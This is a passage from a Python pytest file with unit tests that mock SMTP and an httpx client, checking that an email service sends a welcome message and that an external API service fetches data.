        mock_smtp.return_value = mock_smtp_instance
        
        email_service = EmailService()
        
        # Act
        await email_service.send_welcome_email("test@example.com", "Test User")
        
        # Assert
        mock_smtp.assert_called_once()
        mock_smtp_instance.send_message.assert_called_once()
    
    @pytest.mark.unit
    @patch('app.services.external_api_service.httpx.AsyncClient')
    async def test_external_api_service_mock(self, mock_client):
        """外部API サービスのモックテスト"""
        # Arrange
        mock_response = Mock()
        mock_response.json.return_value = {"status": "success"}
        mock_response.status_code = 200
        
        mock_client_instance = AsyncMock()
        mock_client_instance.get.return_value = mock_response
        mock_client.return_value.__aenter__.return_value = mock_client_instance
        
        from app.services.external_api_service import ExternalApiService
        api_service = ExternalApiService()
        
        # Act
        result = await api_service.fetch_data("test_endpoint")
        
        # Assert
        assert result["status"] == "success"
        mock_client_instance.get.assert_called_once_with("test_endpoint")
```